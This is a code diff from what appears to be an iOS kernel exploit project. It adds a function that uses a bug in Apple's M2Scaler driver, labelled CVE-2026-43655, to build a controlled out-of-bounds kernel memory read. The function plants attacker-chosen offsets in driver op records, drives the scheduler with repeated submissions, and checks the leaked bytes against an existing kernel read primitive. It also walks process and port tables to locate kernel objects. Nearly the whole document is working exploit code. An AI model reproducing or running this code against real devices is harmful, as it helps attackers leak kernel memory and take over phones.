@@ -4324,6 +4324,272 @@ static void *kpM2TDriverMain(void *arg)
     return r;
 }
 
+#pragma mark - M2Scaler oracle (CVE-2026-43655 controlled OOB-read)
+
+// Итерация 3. Из подтверждённой паники 045942 (символизация, раунд 11):
+// credit-resolution pass scheduler'а делает ldrb w10, [sched+0x118 + credit],
+// где credit = поле +0xc3c op-записи — ПОЛНОСТЬЮ наш (sel 10, кодировка
+// struct+0 доказана A4b на железе 1.9.96). Дальше pass делает
+// RMW [entry+0xbc4] += прочитанный_байт и условный [entry+0x1f74] |= 0x100.
+// Значит: credit = смещение → байт из [sched+0x118+смещение] аккумулируется
+// в НАШЕЙ же op-записи → читаем её kread'ом = относительный OOB-read
+// (+0..+4GB от scheduler'а), второй leak-канал, независимый от ClearSword.
+// Метод: discovery (driver → scheduler → entry array → entry VA по маркеру)
+// → oracle-свип смещений с валидацией против прямого kread.
+
+static BOOL gM2OLive = NO;
+static void kpM2OLive(NSString *line)
+{
+    if (!gM2OLive) return;
+    os_log_error(OS_LOG_DEFAULT, "[M2O] %{public}s", [line UTF8String]);
+    extern void KPLogDirect(const char *);
+    KPLogDirect([line UTF8String]);
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2oracle.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
+    if (!h) { [d writeToFile:p atomically:NO]; return; }
+    [h seekToEndOfFile];
+    [h writeData:d];
+    [h synchronizeFile];
+    [h closeFile];
+}
+
+static void kpM2ONote(NSMutableString *r, NSString *line)
+{
+    kpNote(r, line);
+    kpM2OLive(line);
+}
+
+// Собрать уникальные kernel-указатели из объекта.
+static uint32_t kpM2OCollectPtrs(uint64_t va, uint32_t size, uint64_t *out, uint32_t cap, NSMutableString *r)
+{
+    uint8_t buf[0x1000];
+    if (size > sizeof(buf)) size = sizeof(buf);
+    memset(buf, 0, sizeof(buf));
+    if (!kpLooksLikeKernelPointer(va) || !kpRead(va, buf, size, "m2o collect", r)) return 0;
+    uint32_t n = 0;
+    for (uint32_t o = 0; o + 8 <= size && n < cap; o += 8) {
+        uint64_t q = 0;
+        memcpy(&q, buf + o, 8);
+        uint64_t p = kp_untag_ptr(q);
+        if (!kpLooksLikeKernelPointer(p)) continue;
+        BOOL dup = NO;
+        for (uint32_t k = 0; k < n; k++) if (out[k] == p) { dup = YES; break; }
+        if (!dup) out[n++] = p;
+    }
+    return n;
+}
+
+// Маркер по точному оффсету (op-entry: credit @ +0xc3c по символизации паники).
+static BOOL kpM2OMarkerAt(uint64_t va, uint32_t off, uint32_t marker, NSMutableString *r)
+{
+    uint32_t v = 0;
+    return kpLooksLikeKernelPointer(va) &&
+           kpRead(va + off, &v, 4, "m2o marker@", r) && v == marker;
+}
+
++ (NSString *)m2OracleReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2oracle.txt"] error:nil];
+    gM2OLive = YES;
+    kpM2ONote(r, @"=== M2Scaler oracle: controlled OOB-read через credit-index (CVE-2026-43655) ===");
+    kpM2ONote(r, @"паника 045942: ldrb [sched+0x118 + entry->credit(+0xc3c)], RMW entry+0xbc4 += byte. Кредит = наш (sel 10, struct+0).");
+
+    if (!gPrimitives.kreadbuf) {
+        kpM2ONote(r, @"KRW не жив — сначала эксплойт. SKIP.");
+        gM2OLive = NO;
+        return r;
+    }
+
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpM2ONote(r, @"сервис не найден — SKIP");
+        gM2OLive = NO;
+        return r;
+    }
+
+    // is_table цепочка (как в m2TeardownUafReport)
+    uint64_t isTable = 0;
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProof" log:r];
+    uint64_t pr = 0, tk = 0, spc = 0, tb = 0;
+    if (selfProc &&
+        kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "m2o proc_ro", r) &&
+        kpRead(kp_untag_ptr(pr) + off_proc_ro_pr_task, &tk, 8, "m2o task", r) &&
+        kpRead(kp_untag_ptr(tk) + off_task_itk_space, &spc, 8, "m2o itk_space", r) &&
+        kpRead(kp_untag_ptr(spc) + off_ipc_space_is_table, &tb, 8, "m2o is_table", r)) {
+        isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                  ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
+    }
+    if (!isTable) {
+        kpM2ONote(r, @"is_table не разрешена — SKIP");
+        IOObjectRelease(svc);
+        gM2OLive = NO;
+        return r;
+    }
+
+    io_connect_t victim = IO_OBJECT_NULL;
+    if (IOServiceOpen(svc, mach_task_self(), 0, &victim) != KERN_SUCCESS || victim == IO_OBJECT_NULL) {
+        kpM2ONote(r, @"open victim отклонён — SKIP");
+        IOObjectRelease(svc);
+        gM2OLive = NO;
+        return r;
+    }
+    uint64_t victimVA = kpM2TClientVA(r, isTable, victim, @"victim");
+    uint64_t driverVA = kpM2TClientVA(r, isTable, svc, @"driver-svc");
+    kpM2ONote(r, [NSString stringWithFormat:@"  victim client @ %#llx, driver object @ %#llx",
+                  (unsigned long long)victimVA, (unsigned long long)driverVA]);
+
+    // ---- discovery: scheduler = pointee driver'а с layout из паники ----
+    // layout (раунд 11): +0xb8 count (мелкий), +0xc8 entry-array (kptr),
+    // +0x110 второй массив (kptr), +0x118/+0x11c inline byte-arrays.
+    uint64_t cand[64];
+    uint32_t candN = kpM2OCollectPtrs(driverVA, 0x800, cand, 64, r);
+    uint32_t clientN = kpM2OCollectPtrs(victimVA, 0x168, cand + candN, 64 - candN, r);
+    candN += clientN;
+    kpM2ONote(r, [NSString stringWithFormat:@"  discovery: %u указателей из driver+client", candN]);
+
+    uint64_t schedVA = 0;
+    for (uint32_t i = 0; i < candN && !schedVA; i++) {
+        uint64_t cnt = 0, arr = 0, arr2 = 0;
+        if (!kpRead(cand[i] + 0xb8, &cnt, 8, "m2o sch+b8", r)) continue;
+        if (!kpRead(cand[i] + 0xc8, &arr, 8, "m2o sch+c8", r)) continue;
+        if (!kpRead(cand[i] + 0x110, &arr2, 8, "m2o sch+110", r)) continue;
+        arr = kp_untag_ptr(arr);
+        arr2 = kp_untag_ptr(arr2);
+        if (cnt > 0x2000) continue;
+        if (!kpLooksLikeKernelPointer(arr) || !kpLooksLikeKernelPointer(arr2)) continue;
+        schedVA = cand[i];
+        kpM2ONote(r, [NSString stringWithFormat:@"  scheduler-кандидат @ %#llx: count=%llu array=%#llx array2=%#llx",
+                      (unsigned long long)schedVA, (unsigned long long)cnt,
+                      (unsigned long long)arr, (unsigned long long)arr2]);
+    }
+    if (!schedVA)
+        kpM2ONote(r, @"  scheduler по layout не найден — oracle-фаза пропущена, только discovery");
+
+    // ---- victim маркер + async → op-записи несут credit @ +0xc3c ----
+    NSDictionary *sp5 = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
+                          (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    if (!srcS || !dstS) {
+        kpM2ONote(r, @"  IOSurfaceCreate NULL — SKIP");
+        if (srcS) CFRelease(srcS);
+        if (dstS) CFRelease(dstS);
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2OLive = NO;
+        return r;
+    }
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    uint32_t dstID = IOSurfaceGetID(dstS);
+
+    uint8_t s10[0x18];
+    memset(s10, 0, sizeof(s10));
+    *(uint32_t *)s10 = 0xCAFE7777;
+    uint64_t sc[3] = {0, 0, 0};
+    kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+
+    uint8_t tsd[KP_M2_TSD_SIZE];
+    memset(tsd, 0, sizeof(tsd));
+    *(uint32_t *)(tsd + 0x000) = srcID;
+    *(uint32_t *)(tsd + 0x004) = dstID;
+    *(uint64_t *)(tsd + 0x008) = 1;
+    for (int i = 0; i < 8; i++)
+        IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    kpM2ONote(r, [NSString stringWithFormat:@"  victim credit=0xCAFE7777 (kr=0x%x) + 8 async — ищу op-записи", ckr]);
+
+    // entry-array: +0xc8 может быть указателем на массив ИЛИ inline-массивом —
+    // проверяем обе интерпретации, записи опознаём по маркеру на +0xc3c.
+    uint64_t entryVA = 0;
+    if (schedVA) {
+        uint64_t cnt = 0, arr = 0;
+        kpRead(schedVA + 0xb8, &cnt, 8, "m2o cnt", r);
+        kpRead(schedVA + 0xc8, &arr, 8, "m2o arr", r);
+        arr = kp_untag_ptr(arr);
+        uint64_t eptrs[128];
+        uint32_t eN = 0;
+        if (kpLooksLikeKernelPointer(arr) && cnt && cnt <= 128) {
+            uint8_t abuf[128 * 8];
+            memset(abuf, 0, sizeof(abuf));
+            if (kpRead(arr, abuf, cnt * 8, "m2o array", r))
+                for (uint32_t i = 0; i < cnt; i++) {
+                    uint64_t q = 0;
+                    memcpy(&q, abuf + i * 8, 8);
+                    uint64_t p = kp_untag_ptr(q);
+                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+                }
+        }
+        // inline-вариант: указатели прямо в scheduler'е
+        if (!eN) {
+            uint8_t ibuf[0x100];
+            memset(ibuf, 0, sizeof(ibuf));
+            if (kpRead(schedVA + 0xc8, ibuf, sizeof(ibuf), "m2o inline", r))
+                for (uint32_t o = 0; o + 8 <= sizeof(ibuf) && eN < 16; o += 8) {
+                    uint64_t q = 0;
+                    memcpy(&q, ibuf + o, 8);
+                    uint64_t p = kp_untag_ptr(q);
+                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+                }
+        }
+        kpM2ONote(r, [NSString stringWithFormat:@"  entry-array: count=%llu, указателей собрано=%u — проверяю +0xc3c", (unsigned long long)cnt, eN]);
+        for (uint32_t i = 0; i < eN; i++) {
+            if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0xCAFE7777, r)) {
+                entryVA = eptrs[i];
+                kpM2ONote(r, [NSString stringWithFormat:@"  ★ op-запись с нашим маркером @ %#llx (credit +0xc3c подтверждён)", (unsigned long long)entryVA]);
+                break;
+            }
+        }
+        if (!entryVA)
+            kpM2ONote(r, @"  маркер 0xCAFE7777 ни в одной записи массива — записи дренулись/другой layout");
+    }
+
+    // ---- oracle: credit = смещение, читаем байт из [sched+0x118+credit] ----
+    if (schedVA && entryVA) {
+        kpM2ONote(r, @"--- ORACLE: свип смещений (delta entry+0xbc4 vs прямой kread sched+0x118+T) ---");
+        io_connect_t churn = IO_OBJECT_NULL;
+        IOServiceOpen(svc, mach_task_self(), 0, &churn);
+        const uint32_t offsets[] = { 0x0, 0x8, 0x10, 0x40, 0x100, 0x400, 0x1000, 0x4000 };
+        for (int t = 0; t < 8; t++) {
+            uint32_t T = offsets[t];
+            // свежая запись с credit=T
+            memset(s10, 0, sizeof(s10));
+            *(uint32_t *)s10 = T;
+            IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            uint64_t baseCnt = 0;
+            kpRead(entryVA + 0xbc4, &baseCnt, 8, "m2o bc4 base", r);
+            for (int i = 0; i < 4; i++)
+                IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            // гоним pass: churn-сабмиты заставляют pass перечитывать массив
+            for (int i = 0; i < 40 && churn != IO_OBJECT_NULL; i++)
+                IOConnectCallMethod(churn, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            usleep(3000);
+            uint64_t nowCnt = 0;
+            kpRead(entryVA + 0xbc4, &nowCnt, 8, "m2o bc4 now", r);
+            uint8_t direct = 0;
+            BOOL dok = kpRead(schedVA + 0x118 + T, &direct, 1, "m2o direct", r);
+            long long delta = (long long)(nowCnt - baseCnt);
+            kpM2ONote(r, [NSString stringWithFormat:@"  T=%#06x: entry+0xbc4 delta=%lld, прямой байт=%#04x %@ %@",
+                          T, delta, direct, dok ? @"" : @"(kread fail)",
+                          (dok && delta != 0 && direct != 0 && delta % direct == 0) ? @"★ ORACLE MATCH" :
+                          (dok && direct == 0 && delta == 0) ? @"★ ноль-контроль OK" : @"—"]);
+        }
+        if (churn != IO_OBJECT_NULL) IOServiceClose(churn);
+        kpM2ONote(r, @"ORACLE-вердикт: MATCH по серии смещений = managed OOB-read без ClearSword; нули/промахи = pass не трогает запись в этом окне — повторить");
+    }
+
+    kpM2ONote(r, @"=== oracle завершён (паника здесь НЕ нужна: управляемое чтение вместо краша) ===");
+    CFRelease(srcS);
+    CFRelease(dstS);
+    IOServiceClose(victim);
+    IOObjectRelease(svc);
+    gM2OLive = NO;
+    return r;
+}
+
 #pragma mark - HID FastPath UAF (CVE-2026-28992)
 
 // close (sel1) drops provider state unlocked; copyEvent (sel2) calls into it
